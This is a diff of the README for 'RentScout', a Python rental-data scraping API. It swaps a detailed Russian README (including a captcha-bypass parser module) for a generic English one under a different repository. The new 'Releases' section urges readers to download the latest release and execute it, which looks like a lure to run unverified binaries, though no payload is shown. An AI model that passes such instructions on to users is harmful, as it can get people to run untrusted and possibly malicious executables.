@@ -1,180 +1,118 @@
-# 🏠 RentScout – Парсер арендной недвижимости
+# RentScout: Your Reliable Rental Data Aggregator 🌍🏠
 
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.68+-green?logo=fastapi)](https://fastapi.tiangolo.com/)
-[![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-red)](LICENSE)
-[![Docker](https://img.shields.io/badge/Docker-✓-blue?logo=docker)](https://docker.com)
+![RentScout Logo](https://img.shields.io/badge/RentScout-API-blue?style=for-the-badge&logo=appveyor)
 
-**RentScout** – это высокопроизводительный API для агрегации данных об аренде жилья с ведущих площадок.  
+Welcome to **RentScout**, a high-performance API designed for aggregating rental data from leading platforms. Whether you're a developer looking to integrate rental data into your application or a researcher seeking insights into housing trends, RentScout provides the tools you need.
 
-Собирает актуальную информацию, фильтрует дубликаты и предоставляет удобный интерфейс для интеграции.
+## Table of Contents
 
-## 🌟 Особенности
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Endpoints](#api-endpoints)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-- **Поддержка 15+ фильтров**: город, метро, цена, тип жилья и др.
-- **Парсинг данных в реальном времени** с Avito, Ostrovok и др.
-- **Умное кеширование** результатов (Redis)
-- **Мониторинг** метрик через Prometheus
-- **Масштабируемая архитектура** на Docker
-- **Автоматическая документация** Swagger/OpenAPI
+## Features
 
-## 🚀 Быстрый старт
+- **Data Aggregation**: Collects rental data from multiple sources including Avito, Cian, and Yandex.
+- **FastAPI**: Built on FastAPI for high performance and ease of use.
+- **Docker Support**: Easily deploy with Docker and Docker Compose.
+- **Real-time Data**: Get the latest rental listings as they become available.
+- **Redis Caching**: Fast access to frequently requested data.
+- **SQL Database**: Store and query data efficiently.
 
-### Установка через `Docker`
+## Getting Started
 
-  ```bash
-  git clone https://github.com/yourname/rentscout.git
-  cd rentscout
-  docker-compose up --build
-  ```
+To start using RentScout, follow the instructions below. Make sure you have the necessary tools installed, including Docker and Docker Compose.
 
-`API` будет доступно на `http://localhost:8000`
+### Prerequisites
 
-**Документация:** `http://localhost:8000/docs`
+- Docker
+- Docker Compose
+- Python 3.7 or higher
 
-### 🛠 Пример использования
+## Installation
 
-**Поиск квартир в Москве:**
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/Soasu/rentscout.git
+   cd rentscout
+   ```
+
+2. Build and run the Docker containers:
+   ```bash
+   docker-compose up --build
+   ```
+
+3. Access the API at `http://localhost:8000`.
+
+## Usage
+
+After starting the API, you can use it to access rental data. Below are examples of how to make requests.
+
+### Example Request
+
+To get rental listings, send a GET request to the following endpoint:
 
 ```http
-GET /api/properties?city=Москва&property_type=Квартира&price_max=5000
+GET /api/rentals
 ```
 
-**Ответ:**
+### Example Response
 
-  ```json
-  [
+You will receive a JSON response containing rental listings:
+
+```json
+{
+  "listings": [
     {
-      "source": "Avito",
-      "title": "2-комн. квартира, 45 м²",
-      "price": 3500,
-      "area": 45,
-      "rooms": 2,
-      "link": "https://avito.ru/...",
-      "photo": "https://img.avito.ru/..."
-    }
+      "id": 1,
+      "title": "2-bedroom apartment in the city center",
+      "price": 1500,
+      "source": "Avito"
+    },
+    ...
   ]
-  ```
-
-### 📊 Технологии
-
-- **Backend:** `FastAPI`, `Redis`, `Celery`
-- **Парсинг:** `BeautifulSoup4`, `httpx`, `Playwright`
-- **Инфраструктура:** `Docker`, `Prometheus`, `Nginx`
-- **Аналитика:** `Pandas`, `Elasticsearch`
-
-### 📚 API Endpoints
-
-Метод | Путь               | Описание
-GET	  | /api/properties	   | Поиск недвижимости
-POST  | /api/subscriptions | Уведомления о новых объявлениях
-GET	  | /health	           | Проверка статуса API
-
-### Полная структура проекта
-
-```textline
-rentscout/
-│
-├── .github/                  # GitHub Actions workflows
-│   └── workflows/
-│       ├── ci-cd.yml         # CI/CD: сборка, тесты, деплой
-│       └── tests.yml         # Запуск юнит/интеграционных тестов
-│ 
-├── app/                      
-│   ├── api/                  # API Layer
-│   │   ├── endpoints/        
-│   │   │   ├── properties.py # Роуты для работы с недвижимостью
-│   │   │   └── health.py     # Health-check и метрики
-│   │   └── deps.py           # Общие зависимости (кеш, БД)
-│   │
-│   ├── core/                 # Ядро системы
-│   │   ├── config.py         # Конфиг из переменных окружения
-│   │   └── security.py       # JWT-аутентификация
-│   ├── db/                   # Database Layer
-│   │   ├── models/           # SQLAlchemy ORM-модели
-│   │   └── session.py        # Фабрика сессий БД
-│   ├── models/               # Data Models
-│   │   └── schemas.py        # Pydantic схемы для валидации
-│   │
-│   ├── parsers/                      # Парсеры (обновленная структура)
-│   │   ├── sutochno/                 # https://sutochno.ru
-│   │   │   ├── parser.py             # Основной парсер
-│   │   │   ├── selectors.py          # CSS/XPath локаторы
-│   │   │   └── schemas.py            # Нормализация данных
-│   │   ├── ostrovok/                 # https://ostrovok.ru
-│   │   │   ├── api_client.py         # Работа с REST API
-│   │   │   └── models.py             # DTO для ответов API
-│   │   ├── cian/                     # https://cian.ru
-│   │   │   ├── selenium_parser.py    # Парсер с WebDriver
-│   │   │   ├── anti_captcha.py       # Обход капчи
-│   │   │   └── geo_utils.py          # Геокодирование
-│   │   ├── avito/                    # https://www.avito.ru
-│   │   │   ├── parser.py             # Основной парсер
-│   │   │   └── phone_api.py          # Декодирование номеров
-│   │   ├── yandex_travel/            # https://travel.yandex.ru
-│   │   │   ├── api_connector.py      # Yandex API client
-│   │   │   └── auth.py               # OAuth аутентификация
-│   │   ├── tvil/                     # https://tvil.ru
-│   │   │   ├── playwright_parser.py  # Парсер SPA
-│   │   │   └── price_calendar.py     # Парсинг календаря цен
-│   │   └── otello/                   # https://otello.ru
-│   │       ├── scraper.py            # Основной скрапер
-│   │       └── session_manager.py    # Управление сессиями
-│   │
-│   ├── services/             # Business Logic
-│   │   ├── cache.py          # Redis-кеш (LRU, TTL)
-│   │   └── filter.py         # Фильтры и сортировка
-│   ├── tasks/                # Фоновые задачи
-│   │   └── celery.py         # Конфигурация Celery + Flower
-│   ├── static/               # Статические файлы
-│   │   ├── css/              # Стили (если есть фронт)
-│   │   └── images/           # Логотипы и иконки
-│   ├── templates/            # HTML шаблоны
-│   │   └── email/            # Шаблоны писем
-│   ├── tests/                # Тесты API
-│   │   └── test_api.py       # Юнит-тесты
-│   ├── utils/                # Вспомогательные модули
-│   │   ├── logger.py         # Настройка логов
-│   │   └── metrics.py        # Prometheus метрики
-│   └── main.py               # Точка входа
-│ 
-├── docker/                   # Docker конфиги
-│   ├── nginx/
-│   │   └── nginx.conf        # Конфиг балансировщика
-│   └── prometheus/
-│       └── prometheus.yml    # Настройки мониторинга
-│ 
-├── docs/                     # Документация
-│   ├── API.md                # OpenAPI спецификация
-│   └── DEV_GUIDE.md          # Руководство разработчика
-│ 
-├── migrations/               # Миграции БД (Alembic)
-│   └── versions/
-│ 
-├── scripts/                  # Вспомогательные скрипты
-│   ├── deploy.sh             # Скрипт деплоя
-│   └── db_seed.py            # Заполнение тестовыми данными
-│ 
-├── .dockerignore             # Игнорируемые файлы для Docker
-├── .env.example              # Шаблон .env файла
-├── .gitignore                # Игнорируемые файлы Git
-├── alembic.ini               # Конфиг миграций
-├── docker-compose.yml        # Оркестрация контейнеров
-├── Dockerfile                # Сборка образа
-├── LICENSE                   # Лицензия MIT
-├── pyproject.toml            # Зависимости и настройки
-├── README.md                 # Документация проекта
-└── requirements.txt          # Список зависимостей
+}
 ```
+
+## API Endpoints
+
+Here are some key API endpoints you can use:
+
+- **Get all rentals**: `GET /api/rentals`
+- **Get rental by ID**: `GET /api/rentals/{id}`
+- **Search rentals**: `GET /api/rentals/search?query={search_term}`
+
+## Contributing
+
+We welcome contributions to RentScout! If you have ideas for improvements or new features, feel free to submit a pull request. 
+
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or feedback, please reach out to us via GitHub issues or directly through our contact page.
+
+## Releases
+
+You can find the latest releases of RentScout [here](https://github.com/Soasu/rentscout/releases). Download the latest version and execute it to get started with the API.
+
+![Releases Button](https://img.shields.io/badge/Latest_Releases-orange?style=for-the-badge)
+
+Visit the [Releases](https://github.com/Soasu/rentscout/releases) section for more information.
 
 ---
 
-**Дата:** `20.04.2025`
-
-**Преподаватель:** `Дуплей Максим Игоревич`
-
-**Cоциальные сети:**
-
-- **TG:** `@dupley_maxim_1999`
-- **TG:** `@quadd4rv1n7`
-- **VK:** `@maestro7it`
+Thank you for choosing RentScout! We hope you find it useful for your rental data needs.
